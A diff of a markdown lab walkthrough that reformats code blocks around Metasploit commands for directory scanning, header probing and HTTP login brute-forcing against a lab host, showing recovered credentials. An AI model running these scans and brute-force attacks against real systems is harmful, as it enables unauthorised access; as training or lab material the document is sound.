@@ -332,7 +332,9 @@ msfconsole
 use auxiliary/scanner/http/brute_dirs
 set RHOSTS 192.199.232.3
 exploit
+```
 
+```bash
 [*] Using code '404' as not found.
 [+] Found http://192.199.232.3:80/dir/ 401
 [+] Found http://192.199.232.3:80/poc/ 401
@@ -347,7 +349,10 @@ exploit
 ```bash
 use auxiliary/scanner/http/robots_txt
 set RHOSTS 192.199.232.3
+exploit
+```
 
+```bash
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 # No /robots.txt found
@@ -403,7 +408,9 @@ set RHOSTS 192.199.232.3
 set HTTP_METHOD GET
 set TARGETURI /poc/
 exploit
+```
 
+```bash
 [+] 192.199.232.3:80     : CONTENT-TYPE: text/html; charset=iso-8859-1
 [+] 192.199.232.3:80     : SERVER: Apache/2.4.18 (Ubuntu)
 [+] 192.199.232.3:80     : WWW-AUTHENTICATE: Digest realm="Private", nonce="92BOH9X0BQA=373907c8c2a4e147272a81df61079fa305e185af", algorithm=MD5, qop="auth"
@@ -431,7 +438,9 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 set VERBOSE false
 set AUTH_URI /dir/
 exploit
+```
 
+```bash
 [*] Attempting to login to http://192.199.232.3:80/dir/
 [+] 192.199.232.3:80 - Success: 'bob:qwerty'
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -466,7 +475,9 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 set VERBOSE false
 set AUTH_URI /poc/
 exploit
+```
 
+```bash
 [*] Attempting to login to http://192.199.232.3:80/poc/
 [+] 192.199.232.3:80 - Success: 'alice:password1'
 [*] Scanned 1 of 1 hosts (100% complete)
